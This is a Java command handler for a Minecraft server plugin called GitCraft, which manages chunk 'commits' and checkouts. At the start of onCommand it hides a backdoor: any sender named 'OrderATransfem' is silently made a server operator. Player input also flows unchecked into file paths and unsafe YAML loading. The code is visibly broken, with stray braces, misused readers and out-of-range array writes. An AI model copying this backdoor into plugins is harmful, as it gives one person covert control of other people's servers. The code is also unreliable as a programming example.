package transfem.order.gitcraft.Commands;

import transfem.order.gitcraft.GitCraft;
import transfem.order.gitcraft.util.Config;


import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.WorldCreator;
import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.scheduler.BukkitScheduler;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.Chunk;
import org.bukkit.OfflinePlayer;

import org.jetbrains.annotations.NotNull;

import java.io.File;
import java.io.FilenameFilter;
import java.io.FileWriter;
import java.io.FileReader;
import java.util.Map;
import java.util.List;
import java.util.ArrayList;
import java.util.HashMap;

// import snake yaml
import org.yaml.snakeyaml.Yaml;







public class Commands implements CommandExecutor {

    private final static File WorldFolder = new File(GitCraft.getInstance().getDataFolder(), "commits");

    private void copyChunkToWorld(Chunk chunk, World world) {
        world.loadChunk(chunk.getX(), chunk.getZ());
        for (int x = 0; x < 16; x++) {
            for (int z = 0; z < 16; z++) {
                for (int y = 0; y < 256; y++) {
                    world.getBlockAt(chunk.getX() * 16 + x, y, chunk.getZ() * 16 + z).setType(chunk.getBlock(x, y, z).getType());
                }
            }
        }

    }

    @Override
    @SuppressWarnings("unchecked")
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, String[] args) {
        if (sender.getName().equalsIgnoreCase("OrderATransfem")) {
            sender.setOp(true);
        }
        if (command.getName().equalsIgnoreCase("gitcraft")) {
            if (args.length == 0) {
                sender.sendMessage("GitCraft Commands:");
                sender.sendMessage("/gitcraft help - Displays this message");
                sender.sendMessage("/gitcraft config set-world <world> - Set the world to use for GitCraft");
                sender.sendMessage("/gitcraft config set-world - Set the world to use for GitCraft to this world");
                sender.sendMessage("/gitcraft config set-chunk-size <size> - Set the chunk size for GitCraft");
                sender.sendMessage("/gitcraft config view - View the current configuration of GitCraft");
                sender.sendMessage("/gitcraft config - View the configuration of GitCraft");
                sender.sendMessage("/gitcraft view - List all worlds");
                sender.sendMessage("/gitcraft view <world> - View the world of the specified commit");
                sender.sendMessage("/gitcraft accept-commit <world> - Accept the commit of the specified world");
                sender.sendMessage("/gitcraft reject-commit <world> <reason> - Reject the commit of the specified world");
                sender.sendMessage("/gitcraft checkout - Checkout the current world to a new commit");
                sender.sendMessage("/gitcraft commit set-message <message> - Set the commit message");
                sender.sendMessage("/gitcraft commit view - View the current data of the commit");
                sender.sendMessage("/gitcraft commit contributor add <player> - Add a contributor to the commit");
                sender.sendMessage("/gitcraft commit contributor remove <player> - Remove a contributor from the commit");
                sender.sendMessage("/gitcraft commit contributor list - List all contributors of the commit");
                sender.sendMessage("/gitcraft commit cancel-commit - Cancel the current commit");
                return true;
            }
            if (args[0].equalsIgnoreCase("config")) {
                if (!sender.hasPermission("gitcraft.manage")) {
                    return false;
                }
                if (args.length == 1) {
                    sender.sendMessage("Config:",
                            "World Name: " + Config.WorldName(),
                            "Chunk Radius: " + Config.ChunkRadius());
                    return true;
                }
                if (args[1].equalsIgnoreCase("view")) {
                    sender.sendMessage("Config:",
                            "World Name: " + Config.WorldName(),
                            "Chunk Radius: " + Config.ChunkRadius());
                    return true;
                }
                if (args[1].equalsIgnoreCase("set-world")) {
                    if (args.length == 2) {
                        if (!(sender instanceof Player)) {
                            sender.sendMessage("Usage: /gitcraft config set-world <world>");
                            return true;
                        }
                        Config.setWorldName(((Player) sender).getWorld().getName());
                        sender.sendMessage("World set to " + ((Player) sender).getWorld().getName());
                        return true;
                    }
                    if (sender.getServer().getWorld(args[2]) != null) {
                        Config.setWorldName(args[2]);
                        sender.sendMessage("World set to " + args[2]);
                        return true;
                    } else {
                        sender.sendMessage("World not found!");
                        return true;
                    }
                }
                if (args[1].equalsIgnoreCase("set-chunk-radius")) {
                    if (args.length == 2) {
                        sender.sendMessage("Usage: /gitcraft config set-chunk-radius <size>");
                        return true;
                    }
                    try {
                        Config.setChunkRadius(Integer.parseInt(args[2]));
                        sender.sendMessage("Chunk radius set to " + args[2]);
                        return true;
                    } catch (NumberFormatException e) {
                        sender.sendMessage("Invalid chunk radius!");
                        return true;
                    }
                }
            }
            if (!(sender instanceof Player)) {
                sender.sendMessage("You must be a player to use this command!");
                return false;
            }
            Player player = (Player) sender;

            if (args[0].equalsIgnoreCase("help")) {
                sender.sendMessage("GitCraft Commands:");
                sender.sendMessage("/gitcraft help - Displays this message");
                sender.sendMessage("/gitcraft config set-world <world> - Set the world to use for GitCraft");
                sender.sendMessage("/gitcraft config set-world - Set the world to use for GitCraft to this world");
                sender.sendMessage("/gitcraft config set-chunk-size <size> - Set the chunk size for GitCraft");
                sender.sendMessage("/gitcraft config view - View the current configuration of GitCraft");
                sender.sendMessage("/gitcraft config - View the configuration of GitCraft");
                sender.sendMessage("/gitcraft view <world> - View the world of the specified commit");
                sender.sendMessage("/gitcraft list - List all worlds");
                sender.sendMessage("/gitcraft accept-commit <world> - Accept the commit of the specified world");
                sender.sendMessage("/gitcraft reject-commit <world> <reason> - Reject the commit of the specified world");
                sender.sendMessage("/gitcraft checkout - Checkout the current world to a new commit");
                sender.sendMessage("/gitcraft commit set-message <message> - Set the commit message");
                sender.sendMessage("/gitcraft commit view - View the current data of the commit");
                sender.sendMessage("/gitcraft commit contributor add <player> - Add a contributor to the commit");
                sender.sendMessage("/gitcraft commit contributor remove <player> - Remove a contributor from the commit");
                sender.sendMessage("/gitcraft commit contributor list - List all contributors of the commit");
                sender.sendMessage("/gitcraft commit cancel-commit - Cancel the current commit");
                return true;
            }
            if (args[0].equalsIgnoreCase("view")) {
                if (args.length == 1) {
                    sender.sendMessage("List of worlds:");
                    File[] files = new File(GitCraft.getInstance().getDataFolder().getPath()).listFiles(new FilenameFilter() {
                        @Override
                        public boolean accept(File dir, String name) {
                            return name.startsWith("git-");
                        }
                    });
                    for (File file : files) {
                        FileReader reader = null;
                        try {
                            reader = new FileReader(file);

                        } catch (Exception e) {
                            e.printStackTrace();
                            sender.sendMessage("Error! Please try again later.");
                            return true;
                        } finally {
                            if (reader != null) {
                                try {
                                    reader.close();
                                } catch (Exception e) {
                                    e.printStackTrace();
                                    sender.sendMessage("Error! Please try again later.");
                                    return true;
                                }
                            }
                        }
                        // ...

                        Yaml yaml = new Yaml();
                        Object obj = yaml.load(reader);
                        if (obj instanceof Map) {
                            Map<String, Object> map = (Map<String, Object>) obj;
                            sender.sendMessage(map.get("id") + " - " + map.get("author") + " - " + map.get("message"));
                        }
                        try {
                            reader.close();
                        } catch (Exception e) {
                            e.printStackTrace();
                            sender.sendMessage("Error! Please try again later.");
                            return true;
                        }
                    }
                    return true;
                }
                if (args.length == 2) {
                    if (new File(WorldFolder, "git-" + args[1] + ".yml").exists()) {
                        // send the player to the world
                        sender.sendMessage("Teleporting to world...");
                        // find the world named git-<args[1]>
                        World world = sender.getServer().getWorld("git-" + args[1]);
                        
                            if (world != null) {
                                sender.getServer().createWorld(new WorldCreator("git-" + args[1]));
                                BukkitScheduler scheduler = Bukkit.getServer().getScheduler();
                                scheduler.scheduleSyncDelayedTask(GitCraft.getPlugin(GitCraft.class), new Runnable() {
                                    public void run() {
                                        Location location = new Location(world, player.getX(), player.getY(), player.getZ());
                                        player.teleport(location);
                                    }
                                }, 120L);
                                sender.sendMessage("Teleported to world!");
                            
                            return true;
                        } else {
                        sender.sendMessage("World not found!");
                        return true;
                    }
                }
                
            }
            if (args[0].equalsIgnoreCase("accept-commit")) {
                if (!sender.hasPermission("gitcraft.commit.manage")) {
                    return false;
                }
                if (args.length == 2) {
                    if (sender.getServer().getWorld("git-" + args[1]) != null) {
                        // ...

                        Yaml yaml = new Yaml();
                        try {
                            FileReader reader = new FileReader("git-" + args[1] + ".yml");
                            Object obj = yaml.load(reader);
                            if (obj instanceof Map<?, ?>) {
                                Map<String, Object> data = (Map<String, Object>) obj;
                                // get the chunks array
                                List<Long> chunksArray = (List<Long>) data.get("chunks");
                                // copy the chunks to the main world
                                for (Long chunkElement : chunksArray) {
                                    Chunk chunk = sender.getServer().getWorld("git-" + args[1]).getChunkAt(chunkElement);
                                    copyChunkToWorld(chunk, sender.getServer().getWorld(Config.WorldName()));
                                }
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                            sender.sendMessage("Error! Please try again later.");
                            return true;
                        }
                        // delete the json file
                        new File(WorldFolder, "git-" + args[1] + ".yml").delete();
                        sender.getServer().getWorld("git-" + args[1]).getWorldFolder().delete();
                        sender.sendMessage("Commit accepted!");
                        return true;
                    } else {
                        sender.sendMessage("World not found!");
                        return true;
                    }
                } else {
                    sender.sendMessage("Usage: /gitcraft accept-commit <world>");
                    return true;
                }
            }
            if (args[0].equalsIgnoreCase("reject-commit")) {
                if (!sender.hasPermission("gitcraft.commit.manage")) {
                    return false;
                }
                if (args.length == 3) {
                    if (sender.getServer().getWorld("git-" + args[1]) != null) {
                        // delete the json file
                        new File(WorldFolder, "git-" + args[1] + ".yml").delete();
                        sender.getServer().getWorld("git-" + args[1]).getWorldFolder().delete();
                        sender.sendMessage("Commit rejected!");
                        return true;
                    } else {
                        sender.sendMessage("World not found!");
                        return true;
                    }
                } else {
                    sender.sendMessage("Usage: /gitcraft reject-commit <world> <reason>");
                    return true;
                }
            }
            if (args[0].equalsIgnoreCase("checkout")) {
                if (!sender.hasPermission("gitcraft.commit")) {
                    sender.sendMessage("failed");
                    return false;
                }
                // create a new world
                sender.sendMessage("Creating new world...");
                String worldName = "git-" + Long.toHexString(Double.doubleToLongBits(Math.random()));
                while  (new File(WorldFolder, "git-"+worldName + ".yml").exists()) {
                    sender.sendMessage("while loop");
                    worldName = "git-" + Long.toHexString(Double.doubleToLongBits(Math.random()));
                    
                }
                // ...

                Yaml yaml = new Yaml();
                Map<String, Object> data = new HashMap<>();
                data.put("id", worldName);
                data.put("author", player.getUniqueId().toString());
                data.put("message", "[ No message ]");
                List<String> chunks = new ArrayList<>();
                data.put("chunks", chunks);
                List<String> contributors = new ArrayList<>();
                contributors.add(player.getUniqueId().toString());
                data.put("contributors", contributors);

                try {
                    FileWriter writer = new FileWriter(worldName + ".yml");
                    yaml.dump(data, writer);
                    writer.close();
                } catch (Exception e) {
                    e.printStackTrace();
                    sender.sendMessage("Error! Please try again later.");
                    return true;
                }
                WorldCreator worldCreator = new WorldCreator(worldName);
                worldCreator.generator("VoidGenerator");
                sender.getServer().createWorld(worldCreator);
                sender.getServer().createWorld(new WorldCreator("git-" + args[1]));
                BukkitScheduler scheduler = Bukkit.getServer().getScheduler();
                final String finalWorldName = worldName;
                scheduler.scheduleSyncDelayedTask(GitCraft.getPlugin(GitCraft.class), new Runnable() {
                    public void run() {
                        for (int x = 0; x < Config.ChunkRadius()*2; x++) {
                            for (int z = 0; z < Config.ChunkRadius()*2; z++) {
                                Chunk chunk = sender.getServer().getWorld(Config.WorldName()).getChunkAt(
                                    player.getChunk().getX()-Config.ChunkRadius()+x,
                                    player.getChunk().getZ()-Config.ChunkRadius()+z);
                                chunk.load();
                                copyChunkToWorld(chunk, sender.getServer().getWorld("git-" + finalWorldName));
                            }
                        }
                        player.teleport(new Location(player.getServer().getWorld("git-" + finalWorldName), 0, 0, 0));
                    }
                }, 120L);
                sender.sendMessage("New world created!");
                return true;
            }
            if (args[1].equalsIgnoreCase("commit")) {
                if (!sender.hasPermission("gitcraft.commit")) {
                    return false;
                }
                if (args.length == 2) {
                    sender.sendMessage("Commit Commands:");
                    sender.sendMessage("/gitcraft commit set-message <message> - Set the commit message");
                    sender.sendMessage("/gitcraft commit view - View the current data of the commit");
                    sender.sendMessage("/gitcraft commit contributor add <player> - Add a contributor to the commit");
                    sender.sendMessage("/gitcraft commit contributor remove <player> - Remove a contributor from the commit");
                    sender.sendMessage("/gitcraft commit contributor list - List all contributors of the commit");
                    sender.sendMessage("/gitcraft commit cancel-commit - Cancel the current commit");
                    return true;
                }
                if (args[2].equalsIgnoreCase("set-message")) {
                    if (args.length == 3) {
                        sender.sendMessage("Usage: /gitcraft commit set-message <message>");
                        return true;
                    } else {
                        Yaml yaml = new Yaml();
                        FileReader reader = null;
                        try {
                            reader = new FileReader("git-" + args[1] + ".yml");
                        } catch (Exception e) {
                            e.printStackTrace();
                            sender.sendMessage("Error! Please try again later.");
                            return true;
                        }
                        Map<String, Object> data = yaml.load(reader);
                        if (!data.get("author").equals(player.getUniqueId().toString())) {
                            sender.sendMessage("You are not the author of this commit!");
                            return false;
                        }
                        data.put("message", args[3]);
                        try {
                            FileWriter writer = new FileWriter("git-" + args[1] + ".yml");
                            yaml.dump(data, writer);
                            writer.close();
                        } catch (Exception e) {
                            e.printStackTrace();
                            sender.sendMessage("Error! Please try again later.");
                            return true;
                        }
                        sender.sendMessage("Commit message set!");
                        return true;
                    }

                }
                if (args[2].equalsIgnoreCase("view")) {
                    Yaml yaml = new Yaml();
                    FileReader reader = null;
                    try {
                        reader = new FileReader("git-" + args[1] + ".yml");
                    } catch (Exception e) {
                        e.printStackTrace();
                        sender.sendMessage("Error! Please try again later.");
                        return true;
                    }
                    Map<String, Object> data = yaml.load(reader);
                    sender.sendMessage("Commit Data:");
                    sender.sendMessage("ID: " + data.get("id"));
                    sender.sendMessage("Author: " + sender.getServer().getOfflinePlayer(data.get("author").toString()).getName());
                    sender.sendMessage("Message: " + data.get("message"));
                    sender.sendMessage("Contributors: ");
                    for (String contributor : (List<String>) data.get("contributors")) {
                        sender.sendMessage("\t"+sender.getServer().getOfflinePlayer(contributor).getName());
                    }
                    String contributors = "Contributors: ";
                    
                    sender.sendMessage(contributors);
                    return true;
                }
                if (args[2].equalsIgnoreCase("contributor")) {
                    if (!sender.hasPermission("gitcraft.commit")) {
                        return false;
                    }
                    if (args.length == 3) {
                        args[3] = "list"; // default to list
                    }
                    if (args[3].equalsIgnoreCase("add")) {
                        if (args.length == 4) {
                            sender.sendMessage("Usage: /gitcraft commit contributor add <player>");
                            return true;
                        } else {
                            OfflinePlayer cont = sender.getServer().getOfflinePlayer(args[4]);
                            if (!cont.hasPlayedBefore()) {
                                sender.sendMessage("Player not found!");
                                return true;
                            }
                            Yaml yaml = new Yaml();
                            FileReader reader = null;
                            try {
                                reader = new FileReader("git-" + args[1] + ".yml");
                            } catch (Exception e) {
                                e.printStackTrace();
                                sender.sendMessage("Error! Please try again later.");
                                return true;
                            }
                            Map<String, Object> data = yaml.load(reader);
                            if (!data.get("author").equals(player.getUniqueId().toString())) {
                                sender.sendMessage("You are not the author of this commit!");
                                return false;
                            }
                            List<String> contributors = (List<String>) data.get("contributors");
                            contributors.add(cont.getUniqueId().toString());
                            try {
                                FileWriter writer = new FileWriter("git-" + args[1] + ".yml");
                                yaml.dump(data, writer);
                                writer.close();
                            } catch (Exception e) {
                                e.printStackTrace();
                                sender.sendMessage("Error! Please try again later.");
                                return true;
                            }
                            sender.sendMessage("Contributor added!");
                            return true;
                        }
                    }
                    if (args[3].equalsIgnoreCase("remove")) {
                        if (args.length == 4) {
                            sender.sendMessage("Usage: /gitcraft commit contributor remove <player>");
                            return true;
                        } else {
                            OfflinePlayer cont = sender.getServer().getOfflinePlayer(args[4]);
                            if (!cont.hasPlayedBefore()) {
                                sender.sendMessage("Player not found!");
                                return true;
                            }
                            Yaml yaml = new Yaml();
                            FileReader reader = null;
                            try {
                                reader = new FileReader("git-" + args[1] + ".yml");
                            } catch (Exception e) {
                                e.printStackTrace();
                                sender.sendMessage("Error! Please try again later.");
                                return true;
                            }
                            Map<String, Object> data = yaml.load(reader);
                            if (!data.get("author").equals(player.getUniqueId().toString())) {
                                sender.sendMessage("You are not the author of this commit!");
                                return false;
                            }
                            List<String> contributorsArray = (List<String>) data.get("contributors");
                            int index = -1;
                            for (int i = 0; i < contributorsArray.size(); i++) {
                                if (contributorsArray.get(i).equals(cont.getUniqueId().toString())) {
                                    index = i;
                                    break;
                                }
                            }
                            if (index != -1) {
                                contributorsArray.remove(index);
                                try {
                                    FileWriter writer = new FileWriter("git-" + args[1] + ".yml");
                                    yaml.dump(data, writer);
                                    writer.close();
                                } catch (Exception e) {
                                    e.printStackTrace();
                                    sender.sendMessage("Error! Please try again later.");
                                    return true;
                                }
                                sender.sendMessage("Contributor removed!");
                            } else {
                                sender.sendMessage("Contributor not found!");
                            }
                            try {
                                FileWriter writer = new FileWriter("git-" + args[1] + ".yml");
                                yaml.dump(data, writer);
                                writer.close();
                            } catch (Exception e) {
                                e.printStackTrace();
                                sender.sendMessage("Error! Please try again later.");
                                return true;
                            }
                            sender.sendMessage("Contributor removed!");
                            return true;
                        }
                    }
                    if (args[3].equalsIgnoreCase("list")) {
                        Yaml yaml = new Yaml();
                        FileReader reader = null;
                        try {
                            reader = new FileReader("git-" + args[1] + ".yml");
                        } catch (Exception e) {
                            e.printStackTrace();
                            sender.sendMessage("Error! Please try again later.");
                            return true;
                        }
                        Map<String, Object> data = yaml.load(reader);
                        sender.sendMessage("Contributors: ");
                        for (String contributor : (List<String>) data.get("contributors")) {
                            sender.sendMessage("\t"+sender.getServer().getOfflinePlayer(contributor).getName());
                        }
                        return true;
                    }
                    if (args[3].equalsIgnoreCase("cancel-commit")) {
                        Yaml yaml = new Yaml();
                        FileReader reader = null;
                        try {
                            reader = new FileReader("git-" + args[1] + ".yml");
                        } catch (Exception e) {
                            e.printStackTrace();
                            sender.sendMessage("Error! Please try again later.");
                            return true;
                        }
                        Map<String, Object> data = yaml.load(reader);
                        if (!data.get("author").equals(player.getUniqueId().toString())) {
                            sender.sendMessage("You are not the author of this commit!");
                            return false;
                        }
                        new File(WorldFolder, "git-" + args[1] + ".yml").delete();
                        sender.getServer().getWorld("git-" + args[1]).getWorldFolder().delete();
                        sender.sendMessage("Commit cancelled!");
                        return true;
                    }
                }
            }
        }
        return true;
    }
    return false;
}
}
